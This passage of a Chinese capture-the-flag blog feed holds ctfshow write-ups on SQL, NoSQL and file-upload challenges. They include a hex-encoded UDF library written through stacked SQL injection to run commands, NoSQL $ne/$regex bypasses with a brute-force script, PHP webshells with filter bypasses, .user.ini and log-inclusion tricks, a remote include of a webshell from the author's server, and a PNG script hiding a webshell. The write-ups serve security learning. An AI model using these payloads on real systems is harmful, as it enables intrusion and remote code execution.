00004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e<span class="hljs-string">&#x27; into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/2.txt<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select load_file(&#x27;</span>/usr/lib/mariadb/plugin/2.txt<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><p>查看第二部分，导入第三部分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/api/?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select &#x27;</span>332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000<span class="hljs-string">&#x27; into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/3.txt<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select load_file(&#x27;</span>/usr/lib/mariadb/plugin/3.txt<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><p>查看第三部分</p><p>concat 来将这三部分拼接后导入前面得到的路径：/usr/lib/mariadb/plugin/，然后进行合并</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select unhex(concat(load_file(&#x27;</span>/usr/lib/mariadb/plugin/1.txt<span class="hljs-string">&#x27;),load_file(&#x27;</span>/usr/lib/mariadb/plugin/2.txt<span class="hljs-string">&#x27;),load_file(&#x27;</span>/usr/lib/mariadb/plugin/3.txt<span class="hljs-string">&#x27;))) into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/aaa.so<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;create function sys_eval returns string soname &#x27;</span>aaa.so<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>最后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select sys_eval(&#x27;</span><span class="hljs-built_in">ls</span> /<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select sys_eval(&#x27;</span><span class="hljs-built_in">tac</span> /f*<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><h2 id="web249"><a class="markdownIt-Anchor" href="#web249"></a> web249</h2><p>猜测应该是后端用的intval校验，存在漏洞，所以传一个数组即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>[]=flag<br></code></pre></td></tr></table></figure><h2 id="web250"><a class="markdownIt-Anchor" href="#web250"></a> web250</h2><p>MongoDB重言式<br>在mongodb中，要求的查询语句是json格式，如<code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;&#125;</code>，在php中，json就是数组，也就是<code>Array('username'=&gt; 'admin', 'password'=&gt; 'admin')</code>，同时MongoDB要求的json格式中，是可以进行条件查询的，如这样的json: <code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &#123;&quot;$regex&quot;: '^abc$'&#125;&#125;</code>，会匹配密码abc，也就是说，如果键对应的值是一个字符串，那么就相当于条件等于，只不过省去了json，如果键对应的值是json对象，就代表是条件查询<br>payload:<br><code>username[$ne]=1&amp;password[$ne]=1</code></p><p>在api/index.php进行post输入</p><h2 id="web251"><a class="markdownIt-Anchor" href="#web251"></a> web251</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username[<span class="hljs-variable">$ne</span>]=admin&amp;password[<span class="hljs-variable">$ne</span>]=1<br></code></pre></td></tr></table></figure><h2 id="web252"><a class="markdownIt-Anchor" href="#web252"></a> web252</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username[<span class="hljs-variable">$ne</span>]=1&amp;password[<span class="hljs-variable">$regex</span>]=^ctfshow&#123;<br></code></pre></td></tr></table></figure><h2 id="web253"><a class="markdownIt-Anchor" href="#web253"></a> web253</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://f3b14984-c112-4eca-aa7c-17c5102a1214.challenge.ctf.show//api/&#x27;</span><br>dic = string.digits + string.ascii_lowercase + <span class="hljs-string">&#x27;&#123;&#125;-_&#x27;</span><br>out = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>        payload = &#123;<span class="hljs-string">&#x27;username[$ne]&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;password[$regex]&#x27;</span>: <span class="hljs-string">f&#x27;^<span class="hljs-subst">&#123;out+k&#125;</span>&#x27;</span>&#125;<br>        <span class="hljs-keyword">try</span>:<br>            re = requests.post(url, data=payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span> <span class="hljs-keyword">in</span> re.text:  <span class="hljs-comment"># 注意反斜杠需要转义</span><br>                out += k<br>                <span class="hljs-built_in">print</span>(out)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        time.sleep(<span class="hljs-number">0.5</span>)  <span class="hljs-comment"># 添加请求间隔</span><br></code></pre></td></tr></table></figure><hr><p>X1r0z师傅真的神！y4师傅真的神！看师傅的博客学到了很多，看来还是要学学算法的,前前后后一共花了七天的时间，有些劳累了。</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow文件上传</title>
    <link href="/2024/09/20/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2024/09/20/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="web151"><a class="markdownIt-Anchor" href="#web151"></a> web151</h2><h3 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h3><p>测试了一下需要png结尾,传个一句话木马上传之后bp抓包改为php,然后执行就行了，或者蚁剑</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19174901.png" alt="2024-09-19174901"></p><h3 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h3><p>前端js进行修改，把对应的png改成php即可</p><h2 id="web152"><a class="markdownIt-Anchor" href="#web152"></a> web152</h2><p>参照web151的0x01</p><h2 id="web153"><a class="markdownIt-Anchor" href="#web153"></a> web153</h2><p>这题直接改结尾不能成功，尝试htaccess之后发现不行，查阅之后发现前者只适合apache,这里使.user.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=shell.png<br></code></pre></td></tr></table></figure><p>然后也修改为png,再在bp里进行修改</p><p>然后直接上传一句话的图片就行了</p><p>注意本地使用的是index.php进行连接</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19200002.png" alt="2024-09-19200002"></p><h2 id="web154"><a class="markdownIt-Anchor" href="#web154"></a> web154</h2><p>试了一下，给了报错是</p><p>文件上传失败，失败原因：文件内容不合规，上传的木马过滤了php，稍微修改一下🐎就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后进行website/upload/index.php执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=system(<span class="hljs-string">&#x27;tac ../f*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web155"><a class="markdownIt-Anchor" href="#web155"></a> web155</h2><p>和上面web154一致的过程</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19201438.png" alt="2024-09-19201438"></p><h2 id="web156"><a class="markdownIt-Anchor" href="#web156"></a> web156</h2><p>失败原因：文件类型不合规</p><p>在之前的基础上，过滤了<code>[]</code>，可以使用<code>&#123;&#125;</code>进行绕过，其他的流程一致</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>&#123;<span class="hljs-string">&#x27;cmd&#x27;</span>&#125;);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web157"><a class="markdownIt-Anchor" href="#web157"></a> web157</h2><p>这题在之前的基础上对<code>&#123;&#125;</code>,<code>;</code>进行了过滤，根据前面执行的命令，可以直接把要执行的命令传入图片中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac ../f*&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19202826.png" alt="2024-09-19202826"></p><h2 id="web158"><a class="markdownIt-Anchor" href="#web158"></a> web158</h2><p>和web157做题完全一致</p><h2 id="web159"><a class="markdownIt-Anchor" href="#web159"></a> web159</h2><p>本地在之前的基础上禁用了<code>()</code>,正常的函数都不能用了，但是由于php特性</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">``就相当于执行命令<br></code></pre></td></tr></table></figure><p>因此可以这么写木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../f*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>剩余的流程和上面一样</p><h2 id="web160"><a class="markdownIt-Anchor" href="#web160"></a> web160</h2><p>可以传个png进行简单的fuzz一下，再之前的基础上过滤了空格和反引号，以及log,这样基本不用想执行木马了这里学习一下，又是利用日志包含的原理。log用“.”进行绕过。<strong>当命令执行跟木马上传失败的时候，可以利用日志包含上传</strong></p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19211006.png" alt="2024-09-19211006"></p><h2 id="web161"><a class="markdownIt-Anchor" href="#web161"></a> web161</h2><p>在web160的基础上加了GIF89a进行验证就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19212242.png" alt="2024-09-19212242"></p><p>基本上和web160一致</p><h2 id="web162"><a class="markdownIt-Anchor" href="#web162"></a> web162</h2><h3 id="0x01-2"><a class="markdownIt-Anchor" href="#0x01-2"></a> 0x01</h3><p>上强度了，看了一下wp这里的介绍是远程包含，有点xxe那味道了。这题过滤了<code>.</code>基本的文件尾就不能用了。</p><p>由于我们知道具体的文件在哪，所以就直接写命令执行</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">GIF89a<br>auto<span class="hljs-emphasis">_prepend_</span>file=orange<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19214003.png" alt="2024-09-19214003"></p><p>然后写一个orange.png，里面内容是</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">GIF89a<br>&lt;?=include&quot;http://142748273:5000/orange&quot;?&gt;<br></code></pre></td></tr></table></figure><p>简单的解释一下，我在我的一个vps下写了一个马，这里远程包含我的马，我开了5000这个端口，由于.被过滤了，所以需要ip转int型</p><p>其他的流程基本和上面一致</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19220630.png" alt="2024-09-19220630"></p><p>本地你的物理机都需要一开始是png然后在bp里删掉的，这里注意一下。</p><h3 id="0x02-2"><a class="markdownIt-Anchor" href="#0x02-2"></a> 0x02</h3><p>涉及条件竞争，由于环境就不演示了，网上有很多大师傅都有wp讲解，可以去看看</p><h2 id="web163"><a class="markdownIt-Anchor" href="#web163"></a> web163</h2><p>传图片后，会被删除,在网上看wp的时，看到一个约过中间，直接写的思路</p><h3 id="0x01-3"><a class="markdownIt-Anchor" href="#0x01-3"></a> 0x01</h3><p>条件竞争，网上自己找吧</p><h3 id="0x02-3"><a class="markdownIt-Anchor" href="#0x02-3"></a> 0x02</h3><p>直接在.user.ini里写入远程的地址</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">GIF89a<br>auto<span class="hljs-emphasis">_prepend_</span>file=http://142748273:5000/orange<br></code></pre></td></tr></table></figure><p>然后vps开服务，就行了，本地的物理机都还是上传png只不过bp删掉了而已</p><h2 id="web164"><a class="markdownIt-Anchor" href="#web164"></a> web164</h2><p>进行了简单的尝试，发现上传的哪怕是真图片马，也是被进行二次转化，下载下面里面的马就没有了，应该是图片的二次渲染.</p><p>借用网上的脚本跑一下吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br> <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;ornage.png&#x27;</span>);  <br> <br><span class="hljs-comment">/* 木马内容</span><br><span class="hljs-comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//imagepng($img,&#x27;1.png&#x27;);  要修改的图片的路径,1.png是使用的文件，可以不存在</span><br><span class="hljs-comment">//会在目录下自动创建一个1.png图片</span><br><span class="hljs-comment">//图片脚本内容：$_GET[0]($_POST[1]);</span><br><span class="hljs-comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-19224702.png" alt="2024-09-19224702"></p><p>然后ctrl+s把图片下载下来用txt看可以得到flag，第一次见二次渲染的题</p><h2 id="web165"><a class="markdownIt-Anchor" href="#web165"></a> web165</h2><p>上一题是png的二次渲染，这题是jpg的二次渲染，可以通过前端的代码知晓，脚本是网上比较多的，这里直接先贴过来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span 